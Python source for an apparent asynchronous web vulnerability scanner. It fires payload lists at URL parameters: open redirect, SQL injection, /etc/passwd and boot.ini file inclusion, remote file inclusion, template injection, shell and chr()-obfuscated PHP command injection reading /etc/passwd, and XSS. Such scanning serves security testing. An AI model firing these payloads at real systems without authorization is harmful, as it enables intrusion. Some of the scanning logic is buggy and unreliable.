# from __future__ import print_function
from urllib.parse import urlparse
import urllib.request, sys, os, optparse

# from socket import timeout
import asyncio
import json
from datetime import datetime
import hashlib, random


async def fire_payload(
    session,
    full_url,
    vulnerability,
    payload,
    bullseyes,
    username,
    target,
    vulncount,
    scan_session_id,
    sub_path,
):

    result_string = "benign"
    url = full_url.replace("SIDWIPARK", payload)

    try:
        http_request = await session.get(url)
        http_response_raw = await http_request.read()
        http_response = http_response_raw.decode("utf-8")
        http_length = len(http_response)
        http_status = http_request.status

        if any(bullseye in http_response for bullseye in bullseyes) or (
            vulnerability == "SQL Injection"
            and (http_status == 505 or http_status == 503)
        ):
            result_string = "vulnerable"
            vulncount[vulnerability] += 1

        now = datetime.now()
        current_time = now.strftime("%Y-%m-%dT%H:%M")

        id = hashlib.md5((url + str(random.random())).encode("utf-8")).hexdigest()

        report = {
            "id": id,
            "scan_session_id": scan_session_id,
            "scan_type": "url_fuzz",
            "timestamp": current_time,
            "username": username,
            "target": target,
            "sub_path": sub_path,
            "vulnerability": vulnerability,
            "status": http_status,
            "url": url,
            "result_string": result_string,
        }
        request = {
            "id": id,
            "host": target,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Python/3.9 aiohttp/3.7.3",
            "body": "",
        }
        response = {
            "id": id,
            "headers_string": json.dumps(dict(http_request.headers)),
            "body": http_response
        }

    except Exception as exception:
        print("{} at {}:{}".format(exception, vulnerability, url))

    finally:
        return report, request, response


async def url_query_scan(
    session, username, full_url, vulncount, scan_session_id, sub_path
):
    reports_list = []
    requests_list = []
    responses_list = []

    attack_dictionary = {
        "Open Redirect": {
            "payloads": [
                urllib.parse.quote("google.com"),
                urllib.parse.quote("//google.com"),
                urllib.parse.quote("https://google.com"),
            ],
            "bullseyes": ["<title>Google</title>"],
        },
        "SQL Injection": {"payloads": ["'", "\\"], "bullseyes": ["SQL"]},
        # "Windows Directory Traversal": {
        #   "payloads": ["..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini", \
        #                 "..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00", \
        #                 "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm", \
        #                 "..%2fWEB-INF%2fweb.xml"
        #               ],
        #   "bullseyes": ["boot loader", "16-bit", "<web-app"]
        # },
        # "Linux Directory Traversal": {
        #   "payloads": ["/../../../../../../../../../../../../../../../../../etc/passwd", \
        #                 "/../../../../../../../../../../../../../../../../../etc/passwd%00"
        #               ],
        #   "bullseyes": ["root:"]
        # },
        "LFI Check": {
            "payloads": [
                "/etc/passwd",
                "/etc/passwd%00",
                "C:\\boot.ini",
                "C:\\boot.ini%00",
            ],
            "bullseyes": ["root:", "boot loader", "16-bit", "<web-app"],
        },
        "RFI Check": {
            "payloads": [
                "hTtP://tests.arachni-scanner.com/rfi.md5.txt",
                "hTtP://tests.arachni-scanner.com/rfi.md5.txt%00",
            ],
            "bullseyes": ["705cd559b16e6946826207c2199bd890"],
        },
        "SSTI Check": {
            "payloads": [
                urllib.parse.quote("{{1336%2B1}}"),
                urllib.parse.quote("1336+1"),
            ],
            "bullseyes": ["1337"],
        },
        "RCE Linux Check": {
            "payloads": [
                urllib.parse.quote("$(cat+/etc/passwd)"),
                urllib.parse.quote("$(sleep+10)"),
            ],
            "bullseyes": ["root:"],
        },
        "RCE PHP Check": {
            "payloads": [
                urllib.parse.quote("phpinfo()"),
                urllib.parse.quote(
                    "{${passthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))}}{${exit()}}"
                ),
                urllib.parse.quote(
                    "{${passthru(chr(115).chr(108).chr(101).chr(101).chr(112).chr(32).chr(49).chr(48))}}{${exit()}}"
                ),
            ],
            "bullseyes": ["<title>phpinfo()</title>", "root:"],
        },
        # "XSS-Reflection": {"payloads": ["SIDWIPARK"], "bullseyes": ["SIDWIPARK"]},
        # "XSS-Heuristic": {
        #     "payloads": ["%22%3E%3C%2FSIDWIPARK%3E%281%29"],
        #     "bullseyes": ["</SIDWIPARK>(1)"],
        # },
        "XSS": {
            "payloads": [
                "SIDWIPARK",
                "%22%3E%3C%2FSIDWIPARK%3E%281%29",
                urllib.parse.quote('"><iframe/onload=alert(1)>'),
            ],
            "bullseyes": ["SIDWIPARK", "<iframe/onload=alert(1)>"],
        },
    }

    target = full_url.split("?")[0]

    tasks = []

    for vulnerability in attack_dictionary:
        for payload in attack_dictionary[vulnerability]["payloads"]:
            task = asyncio.create_task(
                fire_payload(
                    session=session,
                    full_url=full_url,
                    vulnerability=vulnerability,
                    payload=payload,
                    bullseyes=attack_dictionary[vulnerability]["bullseyes"],
                    username=username,
                    target=target,
                    vulncount=vulncount,
                    scan_session_id=scan_session_id,
                    sub_path=sub_path,
                )
            )
            tasks.append(task)

    for coro in asyncio.as_completed(tasks):
        report, request, response = await coro
        reports_list.append(report)
        requests_list.append(request)
        responses_list.append(response)

    return reports_list, requests_list, responses_list


async def url_scan(
    session, username, full_url, vulncount=None, scan_session_id=None, sub_path=None
):
    reports_list = []
    requests_list = []
    responses_list = []

    attack_dictionary = {
        "Open Redirect": {
            "payloads": [
                urllib.parse.quote("//google.com"),
                urllib.parse.quote("/<>//google.com"),
                urllib.parse.quote("/%252F%252Fgoogle.com"),
                urllib.parse.quote("////google.com/%2e%2e"),
                urllib.parse.quote("/https:/%5cgoogle.com/"),
            ],
            "bullseyes": ["<title>Google</title>"],
        },
        # "Windows Directory Traversal": {
        #   "payloads": [urllib.parse.quote("..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini"), \
        #                 urllib.parse.quote("..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00"), \
        #                 urllib.parse.quote("..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm"), \
        #               ],
        #   "bullseyes": ["boot loader", "16-bit"]
        # },
        # "Linux Directory Traversal": {
        #   "payloads": [urllib.parse.quote("/../../../../../../../../../../../../../../../../../etc/passwd"), \
        #                 urllib.parse.quote("/../../../../../../../../../../../../../../../../../etc/passwd%00")
        #               ],
        #   "bullseyes": ["root:"]
        # }
    }

    target = full_url
    new_url = full_url + "SIDWIPARK"

    tasks = []

    for vulnerability in attack_dictionary:
        for payload in attack_dictionary[vulnerability]["payloads"]:
            # print(session, new_url, vulnerability, payload, attack_dictionary[vulnerability]["bullseyes"], username, target)
            task = asyncio.create_task(
                fire_payload(
                    session=session,
                    full_url=full_url,
                    vulnerability=vulnerability,
                    payload=payload,
                    bullseyes=attack_dictionary[vulnerability]["bullseyes"],
                    username=username,
                    target=target,
                    vulncount=vulncount,
                    scan_session_id=scan_session_id,
                    sub_path=sub_path,
                )
            )
            tasks.append(task)

    for coro in asyncio.as_completed(tasks):
        report, request, response = await coro
        reports_list.append(report)
        requests_list.append(request)
        responses_list.append(response)

    return reports_list, requests_list, responses_list


async def main(url, cookies="", session=None, username=None, scan_session_id=None):
    reports_list = []
    requests_list = []
    responses_list = []
    random.seed(int(datetime.now().timestamp()))
    full_url = str(url)
    payload = "SIDWIPARK"
    parsed = urlparse(url)
    target = "{uri.scheme}://{uri.netloc}".format(uri=parsed)
    sub_path = full_url.split(target)[1]
    vulncount = {
        "SQL Injection": 0,
        "XSS": 0,
        "Open Redirect": 0,
        "Windows Directory Traversal": 0,
        "Linux Directory Traversal": 0,
        "LFI Check": 0,
        "RFI Check": 0,
        "RCE Linux Check": 0,
        "RCE PHP Check": 0,
        "SSTI Check": 0,
    }

    response = await session.get(full_url)
    if response.status == "404" or response.status == "404":
        print("No such page. Skipping...")

    if "=" in full_url:
        parsed = urllib.request.urlparse(full_url)
        params = urllib.parse.parse_qsl(parsed.query)
        param_list = []
        param_vals = []
        param_length = 0

        for x, y in params:
            param_list.extend([str(x + "=")])
            param_vals.extend([str(urllib.parse.quote_plus(y))])
            param_length = param_length + 1

        # FIND BASE URL
        dynamic_url = full_url.find("?")
        base_url = str(full_url[: dynamic_url + 1])

        # LIST EACH PARAMETER
        active_fuzz = 1
        i = 1

        while i <= param_length and active_fuzz <= param_length:
            if i < param_length:
                if i == active_fuzz:
                    base_url += param_list[i - 1] + payload + "&"
                else:
                    base_url += param_list[i - 1] + param_vals[i - 1] + "&"
                i = i + 1

            elif i == param_length:
                if i == active_fuzz:
                    base_url += param_list[i - 1] + payload
                else:
                    base_url += param_list[i - 1] + param_vals[i - 1]
                active_fuzz = active_fuzz + 1
                i = 1
                reports, requests, responses = await url_query_scan(
                    session=session,
                    username=username,
                    full_url=base_url,
                    vulncount=vulncount,
                    scan_session_id=scan_session_id,
                    sub_path=sub_path,
                )
                reports_list += reports
                requests_list += requests
                responses_list += responses
                base_url = str(full_url[: dynamic_url + 1])

        await session.close()

    else:
        reports, requests, responses = await url_scan(
            session=session,
            username=username,
            full_url=full_url,
            vulncount=vulncount,
            scan_session_id=scan_session_id,
            sub_path=sub_path,
        )
        reports_list += reports
        requests_list += requests
        responses_list += responses

        await session.close()

    return reports_list, requests_list, responses_list, vulncount


# asyncio.run(main(url="https://aaa.bbb.com?a=a"))
